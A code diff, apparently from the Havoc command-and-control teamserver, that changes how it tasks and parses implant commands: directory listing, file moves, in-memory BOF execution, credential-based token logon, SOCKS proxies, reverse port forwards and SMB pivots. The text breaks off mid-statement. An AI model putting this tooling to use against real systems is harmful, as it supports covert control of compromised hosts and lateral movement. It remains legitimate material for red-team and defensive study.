@@ -37,7 +37,7 @@ func (a *Agent) UploadMemFileInChunks(FileData []byte) uint32 {
 
 	FileSize := len(FileData)
 	// split the file in chunks of DEMON_MAX_RESPONSE_LENGTH
-	for start := 0; start < FileSize; start += chunkSize {
+	for start := 0; start <= FileSize; start += chunkSize {
 		end := start + chunkSize
 
 		// necessary check to avoid slicing beyond FileData capacity
@@ -210,19 +210,101 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string, C
 		switch Optional["SubCommand"].(string) {
 		case "dir":
 			SubCommand = 1
+
+			var (
+				SubDirs int
+				FilesOnly int
+				DirsOnly int
+				ListOnly int
+			)
+
+			ArgArray  := strings.Split(Arguments, ";")
+			Path      := ArgArray[0]
+			Starts    := ArgArray[5];
+			Contains  := ArgArray[6];
+			Ends      := ArgArray[7];
+
+			if ArgArray[1] == "true" {
+				SubDirs = win32.TRUE
+			} else {
+				SubDirs = win32.FALSE
+			}
+			if ArgArray[2] == "true" {
+				FilesOnly = win32.TRUE
+			} else {
+				FilesOnly = win32.FALSE
+			}
+
+			if ArgArray[3] == "true" {
+				DirsOnly = win32.TRUE
+			} else {
+				DirsOnly = win32.FALSE
+			}
+
+			if ArgArray[4] == "true" {
+				ListOnly = win32.TRUE
+			} else {
+				ListOnly = win32.FALSE
+			}
+
+			// go from \\server\share to \\server\share\
+			if strings.HasPrefix(Path, "\\\\") {
+				uncIndex := strings.Index(Path[2:], "\\")
+				if uncIndex != -1 && strings.Index(Path[uncIndex+3:], "\\") == -1 {
+					Path += "\\" 
+				}
+			}
+
+			// If the file ends in \ or is a drive (C:), throw a * on there
+			if strings.HasSuffix(Path, "\\") {
+				Path += "*"
+			} else if strings.HasSuffix(Path, ":") {
+				Path += "\\*"
+			}
+
 			job.Data = []interface{}{
 				SubCommand,
 				win32.FALSE,
-				common.EncodeUTF16(Arguments + "\\*"),
+				common.EncodeUTF16(Path),
+				SubDirs,
+				FilesOnly,
+				DirsOnly,
+				ListOnly,
+				common.EncodeUTF16(Starts),
+				common.EncodeUTF16(Contains),
+				common.EncodeUTF16(Ends),
 			}
 			break
 
 		case "dir;ui":
 			SubCommand = 1
+
+			// go from \\server\share to \\server\share\
+			if strings.HasPrefix(Arguments, "\\\\") {
+				uncIndex := strings.Index(Arguments[2:], "\\")
+				if uncIndex != -1 && strings.Index(Arguments[uncIndex+3:], "\\") == -1 {
+					Arguments += "\\"
+				}
+			}
+
+			// If the file ends in \ or is a drive (C:), throw a * on there
+			if strings.HasSuffix(Arguments, "\\") {
+				Arguments += "*"
+			} else if strings.HasSuffix(Arguments, ":") {
+				Arguments += "\\*"
+			}
+
 			job.Data = []interface{}{
 				SubCommand,
 				win32.TRUE,
-				common.EncodeUTF16(Arguments + "\\*"),
+				common.EncodeUTF16(Arguments),
+				win32.FALSE,
+				win32.FALSE,
+				win32.FALSE,
+				win32.FALSE,
+				common.EncodeUTF16(""),
+				common.EncodeUTF16(""),
+				common.EncodeUTF16(""),
 			}
 			break
 
@@ -335,6 +417,37 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string, C
 
 			break
 
+                case "mv":
+                        SubCommand = 8
+
+                        var Paths = strings.Split(Arguments, ";")
+                        if len(Paths) >= 2 {
+                                var (
+                                        PathFrom []byte
+                                        PathTo   []byte
+                                )
+
+                                if val, err := base64.StdEncoding.DecodeString(Paths[0]); err == nil {
+                                        PathFrom = []byte(common.EncodeUTF16(string(val)))
+                                } else {
+                                        return nil, err
+                                }
+
+                                if val, err := base64.StdEncoding.DecodeString(Paths[1]); err == nil {
+                                        PathTo = []byte(common.EncodeUTF16(string(val)))
+                                } else {
+                                        return nil, err
+                                }
+
+                                job.Data = []interface{}{
+                                        SubCommand,
+                                        PathFrom,
+                                        PathTo,
+                                }
+                        }
+
+                        break
+
 		case "pwd":
 			SubCommand = 9
 			job.Data = []interface{}{
@@ -383,7 +496,7 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string, C
 		case DEMON_COMMAND_PROC_GREP:
 			job.Data = []interface{}{
 				SubCommand,
-				Arguments,
+				common.EncodeUTF16(Arguments),
 			}
 			break
 
@@ -544,7 +657,8 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string, C
 			ObjectFile   []byte
 			Parameters   []byte
 			Flags        uint32
-			MemFileId    uint32
+			BofFileId    uint32
+			ParamsFileId uint32
 			ok           bool
 		)
 
@@ -578,7 +692,9 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string, C
 			}
 		}
 
-		MemFileId = a.UploadMemFileInChunks(ObjectFile)
+		BofFileId    = a.UploadMemFileInChunks(ObjectFile)
+		// a BOF can have an entire PE in its parameters, so chunk them
+		ParamsFileId = a.UploadMemFileInChunks(Parameters)
 
 		if FunctionName, ok = Optional["FunctionName"].(string); !ok {
 			return nil, errors.New("CoffeeLdr: FunctionName not defined")
@@ -609,8 +725,8 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string, C
 
 		job.Data = []interface{}{
 			FunctionName,
-			MemFileId,
-			Parameters,
+			BofFileId,
+			ParamsFileId,
 			Flags,
 		}
 
@@ -1015,9 +1131,10 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string, C
 				if val, ok = Optional["Arguments"].(string); ok {
 
 					var (
-						Domain   string
-						User     string
-						Password string
+						Domain    string
+						User      string
+						Password  string
+						LogonType int
 
 						ArrayData []string
 					)
@@ -1042,11 +1159,17 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string, C
 						Password = string(val)
 					}
 
+					LogonType, err = strconv.Atoi(ArrayData[3])
+					if err != nil {
+						return job, errors.New("Failed to convert LogonType to int: " + err.Error())
+					}
+
 					job.Data = []interface{}{
 						SubCommand,
 						common.EncodeUTF16(Domain),
 						common.EncodeUTF16(User),
 						common.EncodeUTF16(Password),
+						LogonType,
 					}
 
 					logger.Debug(job.Data)
@@ -1566,7 +1689,7 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string, C
 			/* LclAddr; LclPort; FwdAddr; FwdPort */
 			Params = strings.Split(Param, ";")
 			if len(Param) < 4 {
-				return nil, fmt.Errorf("rportfwd requieres 4 arguments, received %d", len(Params))
+				return nil, fmt.Errorf("rportfwd requires 4 arguments, received %d", len(Params))
 			}
 
 			/* Parse local host & port arguments */
@@ -1609,16 +1732,16 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string, C
 			break
 
 		case "rportfwd remove":
-			var SocketID int
+			var SocketID int64
 
-			SocketID, err = strconv.Atoi(Param)
+			SocketID, err = strconv.ParseInt(Param, 16, 32)
 			if err != nil {
 				return nil, err
 			}
 
 			job.Data = []interface{}{
 				SOCKET_COMMAND_RPORTFWD_REMOVE,
-				SocketID,
+				int(SocketID),
 			}
 			break
 
@@ -1630,10 +1753,37 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string, C
 
 		case "socks add":
 			if Param == "" {
-				return nil, fmt.Errorf("socks add requieres a port")
+				return nil, fmt.Errorf("socks add requires a port")
 			}
 
 			var Socks *socks.Socks
+			var PortNum int
+
+			PortNum, err = strconv.Atoi(Param)
+			if err != nil || PortNum < 1 || PortNum > 65535 {
+				return nil, errors.New("invalid socks5 port")
+			}
+
+			var found = false
+
+			a.SocksSvrMtx.Lock()
+
+			for i := range a.SocksSvr {
+
+				if a.SocksSvr[i].Addr == Param {
+
+					/* socks proxy already exists! */
+					found = true
+
+					break
+				}
+			}
+
+			a.SocksSvrMtx.Unlock()
+
+			if found {
+				return nil, errors.New("a socks5 proxy on that port already exists")
+			}
 
 			Socks = socks.NewSocks("0.0.0.0:" + Param)
 			if Socks == nil {
@@ -1769,7 +1919,7 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string, C
 								if err != io.EOF {
 
 									/* we failed to read from the socks proxy */
-									logger.Error(fmt.Sprintf("Failed to read from socket %x: %v", SocketId, err))
+									logger.Error(fmt.Sprintf("Failed to read from socket %08x: %v", SocketId, err))
 
 									a.SocksClientClose(int32(SocketId))
 
@@ -1830,9 +1980,19 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string, C
 			if Message != nil {
 				if !Socks.Failed {
 
+					var(
+						msg string
+					)
+
+					if a.Info.SleepDelay == 0 && a.Info.SleepJitter == 0 {
+						msg = fmt.Sprintf("Started socks5 server on port %v", Param)
+					} else {
+						msg = fmt.Sprintf("Started socks5 server on port %v. Consider running: sleep 0", Param)
+					}
+
 					*Message = map[string]string{
 						"Type":    "Good",
-						"Message": fmt.Sprintf("Started socks5 server on port %v", Param),
+						"Message": msg,
 						"Output":  "",
 					}
 				}
@@ -2157,9 +2317,7 @@ func (a *Agent) TaskDispatch(RequestID uint32, CommandID uint32, Parser *parser.
 				Message["Message"] = "Agent has been tasked to cleanup and exit process. cya..."
 			}
 
-			a.Active = false
-			teamserver.EventAgentMark(a.NameID, "Dead")
-			teamserver.AgentUpdate(a)
+			teamserver.Died(a)
 			a.RequestCompleted(RequestID)
 
 			teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
@@ -2177,9 +2335,7 @@ func (a *Agent) TaskDispatch(RequestID uint32, CommandID uint32, Parser *parser.
 		Message["Type"] = "Good"
 		Message["Message"] = "Agent has been reached its kill date, tasked to cleanup and exit thread. cya..."
 
-		a.Active = false
-		teamserver.EventAgentMark(a.NameID, "Dead")
-		teamserver.AgentUpdate(a)
+		teamserver.Died(a)
 		a.RequestCompleted(RequestID)
 
 		teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
@@ -2674,95 +2830,142 @@ func (a *Agent) TaskDispatch(RequestID uint32, CommandID uint32, Parser *parser.
 			switch SubCommand {
 			case DEMON_COMMAND_FS_DIR:
 				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_FS - DEMON_COMMAND_FS_DIR", AgentID))
-				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadBytes}) {
+				if Parser.CanIRead([]parser.ReadType{parser.ReadBool, parser.ReadBool, parser.ReadBytes, parser.ReadBool}) {
 
 					var (
-						Exp32    = Parser.ParseInt32()
-						Path     = Parser.ParseUTF16String()
-						Dir      string
-						DirMap   = make(map[string]any)
-						DirArr   []map[string]string
-						Explorer = false
+						Explorer  = Parser.ParseBool()
+						ListOnly  = Parser.ParseBool()
+						StartPath = Parser.ParseUTF16String()
+						Success   = Parser.ParseBool()
+						ReadOne   = false
+						Dir       string
+						DirMap    = make(map[string]any)
+						DirArr    []map[string]string
+						WhatToRead []parser.ReadType
 					)
 
-					if Exp32 == win32.TRUE {
-						Explorer = true
-					}
-
-					if !Explorer {
-						Dir += "\n"
-						Dir += fmt.Sprintf(" %-12s %-8s %-20s  %s\n", "Size", "Type", "Last Modified      ", "Name")
-						Dir += fmt.Sprintf(" %-12s %-8s %-20s  %s\n", "----", "----", "-------------------", "----")
-					}
-
-					for Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadInt64, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadBytes}) {
-						var (
-							IsDir            = Parser.ParseInt32()
-							FileSize         = Parser.ParseInt64()
-							LastAccessDay    = Parser.ParseInt32()
-							LastAccessMonth  = Parser.ParseInt32()
-							LastAccessYear   = Parser.ParseInt32()
-							LastAccessSecond = Parser.ParseInt32()
-							LastAccessMinute = Parser.ParseInt32()
-							LastAccessHour   = Parser.ParseInt32()
-							FileName         = Parser.ParseUTF16String()
-
-							Size         string
-							Type         string
-							LastModified string
-							Name         string
-						)
-
-						Type = "file"
-						Size = ""
-						if IsDir == win32.TRUE {
-							Type = "dir"
+					if ! Success {
+						Output["Type"] = "Error"
+						Output["Message"] = "Failed to enumerate files/folders at specified path: " + StartPath
+					} else {
+						IsFirst := true
+						if ListOnly {
+							WhatToRead = []parser.ReadType{parser.ReadBytes}
 						} else {
-							Size = common.ByteCountSI(int64(FileSize))
+							WhatToRead = []parser.ReadType{parser.ReadBytes, parser.ReadInt32, parser.ReadInt32, parser.ReadInt64}
 						}
+						for Parser.CanIRead(WhatToRead) {
+							var (
+									RootDirPath   = Parser.ParseUTF16String()
+									NumFiles      = Parser.ParseInt32()
+									NumDirs       = Parser.ParseInt32()
+									TotalFileSize int64 = 0
+									ItemsLeft     = NumFiles + NumDirs
+								)
+							if !ListOnly {
+								TotalFileSize = Parser.ParseInt64()
+							}
 
-						LastModified = fmt.Sprintf("%02d/%02d/%d %02d:%02d:%02d", LastAccessDay, LastAccessMonth, LastAccessYear, LastAccessSecond, LastAccessMinute, LastAccessHour)
-						Name = FileName
+							if !ListOnly && !Explorer && NumFiles + NumDirs > 0 {
+								if IsFirst {
+									IsFirst = false
+									Dir += fmt.Sprintf(" Directory of %s:\n\n", RootDirPath)
+								} else {
+									Dir += fmt.Sprintf("\n\n Directory of %s:\n\n", RootDirPath)
+								}
+							}
 
-						// ignore these. not needed
-						if Name == "." || Name == ".." || Name == "" {
-							continue
+							for (ItemsLeft > 0 && ((ListOnly && Parser.CanIRead([]parser.ReadType{parser.ReadBytes})) || (!ListOnly && Parser.CanIRead([]parser.ReadType{parser.ReadBytes, parser.ReadBool, parser.ReadInt64, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32})))) {
+
+								var (
+									FileName         = Parser.ParseUTF16String()
+									IsDir            = false
+									FileSize         int64 = 0
+									LastAccessDay    = 0
+									LastAccessMonth  = 0
+									LastAccessYear   = 0
+									LastAccessMinute = 0
+									LastAccessHour   = 0
+
+									Size         string
+									Type         string
+									LastModified string
+									DirText      string
+								)
+
+								if !ListOnly {
+									IsDir            = Parser.ParseBool()
+									FileSize         = Parser.ParseInt64()
+									LastAccessDay    = Parser.ParseInt32()
+									LastAccessMonth  = Parser.ParseInt32()
+									LastAccessYear   = Parser.ParseInt32()
+									LastAccessMinute = Parser.ParseInt32()
+									LastAccessHour   = Parser.ParseInt32()
+								}
+
+								ReadOne = true
+
+								if ListOnly {
+									Dir += fmt.Sprintf("%s%s\n", RootDirPath[:len(RootDirPath)-1], FileName)
+								} else {
+									LastModified = fmt.Sprintf("%02d/%02d/%d  %02d:%02d", LastAccessDay, LastAccessMonth, LastAccessYear, LastAccessHour, LastAccessMinute)
+									if IsDir {
+										Type = "dir"
+										DirText = "<DIR>"
+										Size    = ""
+									} else {
+										DirText = ""
+										Size    = common.ByteCountSI(int64(FileSize))
+									}
+
+									if Explorer {
+										DirArr = append(DirArr, map[string]string{
+											"Type":     Type,
+											"Size":     Size,
+											"Modified": LastModified,
+											"Name":     FileName,
+										})
+									} else {
+										Dir += fmt.Sprintf("%-17s    %-5s  %-12s   %-8s\n", LastModified, DirText, Size, FileName)
+									}
+								}
+
+								ItemsLeft -= 1
+							}
+
+							if NumFiles + NumDirs > 0 && !Explorer && !ListOnly {
+								Dir += fmt.Sprintf("               %d File(s)     %s\n", NumFiles, common.ByteCountSI(TotalFileSize))
+								Dir += fmt.Sprintf("               %d Folder(s)", NumDirs)
+							}
+
+							if Explorer {
+								DirMap["Path"] = []byte(RootDirPath)
+								DirMap["Files"] = DirArr
+
+								DirJson, err := json.Marshal(DirMap)
+								if err != nil {
+									logger.Debug("[Error] " + err.Error())
+								} else {
+									Output["MiscType"] = "FileExplorer"
+									Output["MiscData"] = base64.StdEncoding.EncodeToString(DirJson)
+								}
+							}
 						}
 
 						if !Explorer {
-							Dir += fmt.Sprintf(" %-12s %-8s %-20s  %-8v\n", Size, Type, LastModified, Name)
-						} else {
-							DirArr = append(DirArr, map[string]string{
-								"Type":     Type,
-								"Size":     Size,
-								"Modified": LastModified,
-								"Name":     Name,
-							})
-						}
-
-					}
-
-					if !Explorer {
-						Output["Type"] = "Info"
-						Output["Message"] = fmt.Sprintf("List Directory: %v", Path)
-						Output["Output"] = Dir
-					} else {
-						DirMap["Path"] = []byte(Path)
-						DirMap["Files"] = DirArr
-
-						DirJson, err := json.Marshal(DirMap)
-						if err != nil {
-							logger.Debug("[Error] " + err.Error())
-						} else {
-							Output["MiscType"] = "FileExplorer"
-							Output["MiscData"] = base64.StdEncoding.EncodeToString(DirJson)
+							if ReadOne == false {
+								Output["Type"] = "Info"
+								Output["Output"] = "No file or folder was found"
+							} else {
+								Output["Type"] = "Info"
+								Output["Output"] = Dir
+							}
 						}
 					}
+
 					a.RequestCompleted(RequestID)
 				} else {
 					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_FS - DEMON_COMMAND_FS_DIR, Invalid packet", AgentID))
-					Output["Type"] = "Error"
-					Output["Message"] = "No files/folders at specified path"
 				}
 
 				break
@@ -2983,6 +3186,31 @@ func (a *Agent) TaskDispatch(RequestID uint32, CommandID uint32, Parser *parser.
 				}
 
 				break
+
+                        case DEMON_COMMAND_FS_MOVE:
+                                if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadBytes, parser.ReadBytes}) {
+                                        var (
+                                                Success  = Parser.ParseInt32()
+                                                PathFrom = Parser.ParseUTF16String()
+                                                PathTo   = Parser.ParseUTF16String()
+                                        )
+
+                                        logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_FS - DEMON_COMMAND_FS_MOVE, Success: %d, PathFrom: %v, PathTo: %v", AgentID, Success, PathFrom, PathTo))
+
+                                        if Success == win32.TRUE {
+                                                Output["Type"] = "Good"
+                                                Output["Message"] = fmt.Sprintf("Successful moved file %v to %v", PathFrom, PathTo)
+                                        } else {
+                                                Output["Type"] = "Error"
+                                                Output["Message"] = fmt.Sprintf("Failed to moved file %v to %v", PathFrom, PathTo)
+                                        }
+                                        a.RequestCompleted(RequestID)
+                                } else {
+                                        logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_FS - DEMON_COMMAND_FS_MOVE, Invalid packet", AgentID))
+                                }
+
+                                break
+
 
 			case DEMON_COMMAND_FS_GET_PWD:
 
@@ -3491,10 +3719,10 @@ func (a *Agent) TaskDispatch(RequestID uint32, CommandID uint32, Parser *parser.
 					)
 
 					for Parser.CanIRead([]parser.ReadType{parser.ReadBytes, parser.ReadInt32, parser.ReadInt32, parser.ReadBytes, parser.ReadInt32}) {
-						ProcName = Parser.ParseString()
+						ProcName = Parser.ParseUTF16String()
 						ProcID = Parser.ParseInt32()
 						ParentPID = Parser.ParseInt32()
-						ProcUser = Parser.ParseString()
+						ProcUser = Parser.ParseUTF16String()
 						ProcArch = Parser.ParseInt32()
 
 						Output += fmt.Sprintf(
@@ -3539,7 +3767,7 @@ func (a *Agent) TaskDispatch(RequestID uint32, CommandID uint32, Parser *parser.
 					}
 
 					if Success == 0 || Piped == 0 {
-						// if we don't expect to recieve output, then close the RequestID
+						// if we don't expect to receive output, then close the RequestID
 						a.RequestCompleted(RequestID)
 					}
 				} else {
@@ -3739,7 +3967,7 @@ func (a *Agent) TaskDispatch(RequestID uint32, CommandID uint32, Parser *parser.
 				)
 
 				OutputMap["Type"] = "Error"
-				OutputMap["Message"] = fmt.Sprintf("Exception %v [%x] accured while executing BOF at address %x", win32.StatusToString(int64(Exception)), Exception, Address)
+				OutputMap["Message"] = fmt.Sprintf("Exception %v [%x] occurred while executing BOF at address %x", win32.StatusToString(int64(Exception)), Exception, Address)
 				a.RequestCompleted(RequestID)
 				teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, OutputMap)
 			} else {
@@ -5000,22 +5228,24 @@ func (a *Agent) TaskDispatch(RequestID uint32, CommandID uint32, Parser *parser.
 										Message["MiscType"] = "reconnect"
 										Message["MiscData"] = fmt.Sprintf("%v;%x", a.NameID, AgentHdr.AgentID)
 
-										if DemonInfo.Pivots.Parent == nil {
-											//logger.Warn(fmt.Sprintf("SMB agent [%x] does not have a Parent!", AgentHdr.AgentID))
-											DemonInfo.Pivots.Parent = a
-										}
-
-										for i := range DemonInfo.Pivots.Parent.Pivots.Links {
-											if DemonInfo.Pivots.Parent.Pivots.Links[i].NameID == fmt.Sprintf("%08x", AgentHdr.AgentID) {
-												DemonInfo.Pivots.Parent.Pivots.Links = append(DemonInfo.Pivots.Parent.Pivots.Links[:i], DemonInfo.Pivots.Parent.Pivots.Links[i+1:]...)
-												break
+										if DemonInfo.Pivots.Parent != nil {
+											for i := range DemonInfo.Pivots.Parent.Pivots.Links {
+												if DemonInfo.Pivots.Parent.Pivots.Links[i].NameID == fmt.Sprintf("%08x", AgentHdr.AgentID) {
+													DemonInfo.Pivots.Parent.Pivots.Links = append(DemonInfo.Pivots.Parent.Pivots.Links[:i], DemonInfo.Pivots.Parent.Pivots.Links[i+1:]...)
+													break
+												}
 											}
 										}
 
+										DemonInfo.Active = true
+										DemonInfo.Reason = ""
 										DemonInfo.Pivots.Parent = a
 
 										a.Pivots.Links = append(a.Pivots.Links, DemonInfo)
 										teamserver.LinkAdd(a, DemonInfo)
+
+										teamserver.AgentUpdate(DemonInfo)
+										teamserver.AgentUpdate(a)
 
 									} else {
 										// if the agent doesn't exist then we assume that it's a register request from a new agent
@@ -5030,9 +5260,6 @@ func (a *Agent) TaskDispatch(RequestID uint32, CommandID uint32, Parser *parser.
 
 										teamserver.AgentAdd(DemonInfo)
 										teamserver.AgentSendNotify(DemonInfo)
-
-										// start a goroutine that updates the GUI last callback time each second.
-										go DemonInfo.BackgroundUpdateLastCallbackUI(teamserver)
 									}
 
 									if DemonInfo != nil {
@@ -5100,18 +5327,10 @@ func (a *Agent) TaskDispatch(RequestID uint32, CommandID uint32, Parser *parser.
 						Message["MiscType"] = "disconnect"
 						Message["MiscData"] = fmt.Sprintf("%08x", AgentID)
 
+
 						AgentInstance := teamserver.AgentInstance(AgentID)
 						if AgentInstance != nil {
-							AgentInstance.Active = false
-							AgentInstance.Reason = "Disconnected"
-						}
-
-						for i := range a.Pivots.Links {
-							if a.Pivots.Links[i].NameID == Message["MiscData"] {
-								teamserver.LinkRemove(a, a.Pivots.Links[i])
-								a.Pivots.Links = append(a.Pivots.Links[:i], a.Pivots.Links[i+1:]...)
-								break
-							}
+							teamserver.LinkRemove(a, AgentInstance, true)
 						}
 					} else {
 						Message["Type"] = "Error"
@@ -5139,6 +5358,7 @@ func (a *Agent) TaskDispatch(RequestID uint32, CommandID uint32, Parser *parser.
 
 							PivotAgent = teamserver.AgentInstance(AgentHdr.AgentID)
 							if PivotAgent != nil {
+								PivotAgent.UpdateLastCallback(teamserver)
 								//logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_PIVOT - DEMON_PIVOT_SMB_COMMAND, Linked Agent: %s, Command: %d", AgentID, PivotAgent.NameID, Command))
 
 								// while we can read a command and request id, parse new packages
@@ -5415,8 +5635,6 @@ func (a *Agent) TaskDispatch(RequestID uint32, CommandID uint32, Parser *parser.
 
 					if Success == win32.TRUE {
 						a.Console(teamserver.AgentConsole, "Info", fmt.Sprintf("Started reverse port forward on %s:%d to %s:%d [Id: %x]", LclString, LclPort, FwdString, FwdPort, SocktID), "")
-						a.Console(teamserver.AgentConsole, "Warn", "Dont forget to go interactive to make it usable", "")
-
 						return
 					} else {
 						a.Console(teamserver.AgentConsole, "Erro", fmt.Sprintf("Failed to start reverse port forward on %s:%d to %s:%d", LclString, LclPort, FwdString, FwdPort), "")
@@ -5476,10 +5694,11 @@ func (a *Agent) TaskDispatch(RequestID uint32, CommandID uint32, Parser *parser.
 
 			case SOCKET_COMMAND_RPORTFWD_REMOVE:
 
-				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32}) {
+				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32}) {
 
 					var (
 						SocktID = 0
+						Type    = 0
 						LclAddr = 0
 						LclPort = 0
 						FwdAddr = 0
@@ -5490,19 +5709,22 @@ func (a *Agent) TaskDispatch(RequestID uint32, CommandID uint32, Parser *parser.
 					)
 
 					SocktID = Parser.ParseInt32()
+					Type    = Parser.ParseInt32()
 					LclAddr = Parser.ParseInt32()
 					LclPort = Parser.ParseInt32()
 					FwdAddr = Parser.ParseInt32()
 					FwdPort = Parser.ParseInt32()
 
-					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET - SOCKET_COMMAND_RPORTFWD_REMOVE, SocktID: %x, LclAddr: %d, LclPort: %d, FwdAddr: %d, FwdPort: %d", AgentID, SocktID, LclAddr, LclPort, FwdAddr, FwdPort))
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET - SOCKET_COMMAND_RPORTFWD_REMOVE, Type: %d, SocktID: %x, LclAddr: %d, LclPort: %d, FwdAddr: %d, FwdPort: %d", AgentID, Type, SocktID, LclAddr, LclPort, FwdAddr, FwdPort))
 
 					LclString = common.Int32ToIpString(int64(LclAddr))
 					FwdString = common.Int32ToIpString(int64(FwdAddr))
 
-					Message = map[string]string{
-						"Type":    "Info",
-						"Message": fmt.Sprintf("Successful closed and removed rportfwd [SocketID: %x] [Forward: %s:%d -> %s:%d]", SocktID, LclString, LclPort, FwdString, FwdPort),
+					if Type == SOCKET_TYPE_REVERSE_PORTFWD {
+						Message = map[string]string{
+							"Type":    "Info",
+							"Message": fmt.Sprintf("Successful closed and removed rportfwd [SocketID: %x] [Forward: %s:%d -> %s:%d]", SocktID, LclString, LclPort, FwdString, FwdPort),
+						}
 					}
 
 					/* finally close our port forwarder */
@@ -5571,68 +5793,22 @@ func (a *Agent) TaskDispatch(RequestID uint32, CommandID uint32, Parser *parser.
 					FwdAddr = Parser.ParseInt32()
 					FwdPort = Parser.ParseInt32()
 
-					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET - SOCKET_COMMAND_OPEN, SocktID: %x, LclAddr: %d, LclPort: %d, FwdAddr: %d, FwdPort: %d", AgentID, SocktID, LclAddr, LclPort, FwdAddr, FwdPort))
+					// avoid too much spam
+					//logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET - SOCKET_COMMAND_OPEN, SocktID: %08x, LclAddr: %d, LclPort: %d, FwdAddr: %d, FwdPort: %d", AgentID, SocktID, LclAddr, LclPort, FwdAddr, FwdPort))
 
 					FwdString = common.Int32ToIpString(int64(FwdAddr))
 					FwdString = fmt.Sprintf("%s:%d", FwdString, FwdPort)
 
 					if Socket := a.PortFwdGet(SocktID); Socket != nil {
 						/* Socket already exists. don't do anything. */
+						logger.Debug("Socket already exists")
 						return
 					}
 
-					/* add this rportfw */
+					/* add this rportfwd */
 					a.PortFwdNew(SocktID, LclAddr, LclPort, FwdAddr, FwdPort, FwdString)
 
-					err := a.PortFwdOpen(SocktID)
-					if err != nil {
-						a.Console(teamserver.AgentConsole, "Erro", fmt.Sprintf("Failed to open reverse port forward host %s: %v", FwdString, err), "")
-						return
-					}
-
-					/* after we managed to open a socket to the forwarded host lets start a
-					 * goroutine where we read the data from the forwarded host and send it to the agent. */
-					go func() {
-
-						for {
-
-							/* get rportfwd socket from array */
-							if Socket := a.PortFwdGet(SocktID); Socket != nil {
-
-								if Data, err := a.PortFwdRead(SocktID); err == nil {
-
-									/* only send the data if there is something... */
-									if len(Data) > 0 {
-
-										/* make a new job */
-										var job = Job{
-											Command: COMMAND_SOCKET,
-											Data: []any{
-												SOCKET_COMMAND_WRITE,
-												Socket.SocktID,
-												Data,
-											},
-										}
-
-										/* append the job to the task queue */
-										a.AddJobToQueue(job)
-
-									}
-
-								} else {
-									/* we failed to read from the portfwd */
-									logger.Error(fmt.Sprintf("Failed to read from socket %x: %v", Socket.SocktID, err))
-								}
-
-							} else {
-								/* seems like we have been removed from the list.
-								 * exit this goroutine */
-								return
-							}
-
-						}
-
-					}()
+					/* we will open the rportfwd client only after we have something to write */
 
 				} else {
 					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET - SOCKET_COMMAND_OPEN, Invalid packet", AgentID))
@@ -5646,7 +5822,7 @@ func (a *Agent) TaskDispatch(RequestID uint32, CommandID uint32, Parser *parser.
 
 				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadInt32, parser.ReadInt32}) {
 					var (
-						Id      = Parser.ParseInt32()
+						SocktID = Parser.ParseInt32()
 						Type    = Parser.ParseInt32()
 						Success = Parser.ParseInt32()
 					)
@@ -5656,35 +5832,82 @@ func (a *Agent) TaskDispatch(RequestID uint32, CommandID uint32, Parser *parser.
 							var(
 								Data = Parser.ParseBytes()
 							)
-							logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET - SOCKET_COMMAND_READ,    Id: %08x, Type: %d, DataLength: %x", AgentID, Id, Type, len(Data)))
+							// avoid too much spam
+							//logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SOCKET - SOCKET_COMMAND_READ, SocktID: %08x, Type: %d, DataLength: %x", AgentID, SocktID, Type, len(Data)))
 
 							if Type == SOCKET_TYPE_CLIENT {
 
-								/* check if there is a socket with that portfwd id */
-								if Socket := a.PortFwdGet(Id); Socket != nil {
+								/* we only open rportfwd clients once we have data to write */
+								opened, err := a.PortFwdIsOpen(SocktID)
+								if err != nil {
+									a.Console(teamserver.AgentConsole, "Erro", fmt.Sprintf("Failed to write to reverse port forward host: %v", err), "")
+									return
+								}
 
-									/* write the data to the forwarded host */
-									err := a.PortFwdWrite(Id, Data)
+								/* if first time, open the client */
+								if opened == false {
+									err := a.PortFwdOpen(SocktID)
 									if err != nil {
-										a.Console(teamserver.AgentConsole, "Erro", fmt.Sprintf("Failed to write to reverse port forward host %s: %v", Socket.Target, err), "")
+										logger.Debug(fmt.Sprintf("Failed to open rportfwd: %v", err))	
